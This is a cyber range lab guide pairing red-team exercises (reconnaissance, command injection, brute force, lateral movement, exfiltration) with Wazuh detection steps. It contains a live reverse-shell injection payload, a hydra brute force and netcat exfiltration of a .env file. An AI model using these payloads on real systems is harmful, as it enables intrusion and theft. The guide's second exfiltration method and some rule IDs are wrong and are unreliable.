🔴 Attack Scenarios Guide
This document provides step-by-step exercises to practice both offensive (Red Team) and defensive (Blue Team) techniques in the cyber range lab.

Table of Contents
Scenario 1: External Reconnaissance

Scenario 2: Web Application Attack

Scenario 3: Brute Force Attack

Scenario 4: Lateral Movement

Scenario 5: Data Exfiltration

Defensive Monitoring & Response

Scenario 1: External Reconnaissance
Objective: Perform initial discovery and enumeration of the lab network without triggering excessive alerts.
Attacker VM: Kali Linux (192.168.56.200)
Target: Entire network range (192.168.56.0/24)

Steps:
Host Discovery: Identify active hosts on the network.

sudo netdiscover -r 192.168.56.0/24
# OR
nmap -sn 192.168.56.0/24

Note the IPs of DC01, WEB01, and CLIENT01.

Port Scanning: Perform a SYN scan on a specific target (WEB01).

nmap -sS -T4 192.168.56.20

You should discover ports 21 (FTP), 80 (HTTP), and 445 (SMB).

Service Enumeration: Interrogate the discovered ports to identify versions.

nmap -sV -sC -p21,80,445 -oA web01_scan 192.168.56.20


✅ Success: You have mapped the attack surface of the web server.

Scenario 2: Web Application Attack
Objective: Exploit a command injection vulnerability on the WEB01 server.
Target: Ubuntu WEB01 (192.168.56.20)

Steps:
Browse to the vulnerable page: From your Kali machine, open Firefox and go to http://192.168.56.20/vulnerable.php.

Test Command Injection: In the "Enter a host to ping" field, try injecting a command:

google.com; whoami

The page should output the result of the whoami command (e.g., www-data), proving the vulnerability.

Gain a Reverse Shell:

On your Kali attacker machine, set up a netcat listener:

nc -nvlp 4444

In the web form, inject a reverse shell command. Replace [KALI-IP] with 192.168.56.200:

google.com; bash -c 'bash -i >& /dev/tcp/192.168.56.200/4444 0>&1'

Check your netcat listener. You should now have a command shell on WEB01.

✅ Success: You have achieved initial compromise and have a foothold on the network.

Scenario 3: Brute Force Attack
Objective: Gain access to the FTP service on WEB01 using a weak password.
Target: FTP service on WEB01 (192.168.56.20:21)

Steps:
Launch a brute force attack using hydra and the provided wordlist.

hydra -l developer -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.20
The password is password123, so it should be found very quickly.

Login with compromised credentials:

ftp 192.168.56.20
Username: developer
Password: password123

✅ Success: You have demonstrated access via weak credentials.

Scenario 4: Lateral Movement
Objective: Move from the compromised WEB01 server to the CLIENT01 workstation.
Prerequisite: You must have a shell on WEB01 from Scenario 2.

Steps:
Discover Network Services: From your WEB01 shell, see what other machines are alive.

# Linux command from the WEB01 shell
ping -c 1 192.168.56.101


Scan for SMB Shares: Use Kali's tools to scan CLIENT01 for accessible file shares.

# Run this from your KALI machine, targeting CLIENT01
nmap -p 445 --script smb-enum-shares 192.168.56.101

Attempt to Access a Share:

# Try to connect to the default C$ share
smbclient //192.168.56.101/C$ -U COMPANY/Administrator


You will be prompted for a password. This may fail, but the attempt will generate logs.

✅ Success: You have attempted to move laterally, generating detectable event logs.

Scenario 5: Data Exfiltration
Objective: Locate and exfiltrate a fake "secret" file from WEB01.
Prerequisite: Shell on WEB01.

Steps:
Search for interesting files:

# From your WEB01 shell
find / -name "*.txt" -type f 2>/dev/null
find / -name ".env" -type f 2>/dev/null

Exfiltrate the file: You found /var/www/html/.env and /var/backups/passwd.backup.

Method 1: Use netcat. On Kali: nc -nvlp 8080 > stolen_file.env. On WEB01: nc 192.168.56.200 8080 < /var/www/html/.env.

Method 2: Use a simple web server. On Kali: sudo python3 -m http.server 80. On WEB01: curl 192.168.56.200/.env -o /tmp/.env.

✅ Success: You have identified and extracted sensitive data.

🔵 Defensive Monitoring & Response
For each attack scenario above, switch to the Wazuh dashboard on DC01 (https://192.168.56.15) and practice these defensive actions:

For Scenario 1 (Reconnaissance):
Where to Look: Security Events → Filter by Agent: web01 → Search for rule IDs 100100 (ICMP) or 1002 (port scan).

Response: Create a custom rule to alert on any scan from the Kali IP (192.168.56.200).

For Scenario 2 (Web Attack):
Where to Look: Security Events → Filter by Agent: web01 → Search for vulnerable.php or rule 31107 (Apache error).

Response: The command injection should trigger a alert. Block the attacker's IP at the web application level or network firewall.

For Scenario 3 (Brute Force):
Where to Look: Security Events → Filter by Agent: web01 → Search for ftp and authentication failure.

Response: The Wazuh rule 1002 (multiple authentication failures) should trigger. The response would be to block the source IP and disable the compromised developer account.

For Scenario 4 (Lateral Movement):
Where to Look: Security Events → Filter by Agent: client01 → Search for smb or EventID: 4625 (failed logon).

Response: An alert for multiple SMB login failures from WEB01's IP would indicate lateral movement attempts. Isolate the compromised WEB01 server for forensic analysis.

For Scenario 5 (Data Exfiltration):
Where to Look: Security Events → Filter by Agent: web01 → Search for .env or passwd.backup.

Response: File Integrity Monitoring (FIM) should alert on the access or modification of the sensitive .env file. This requires immediate investigation.

Remember to revert snapshots after each scenario to reset the lab environment!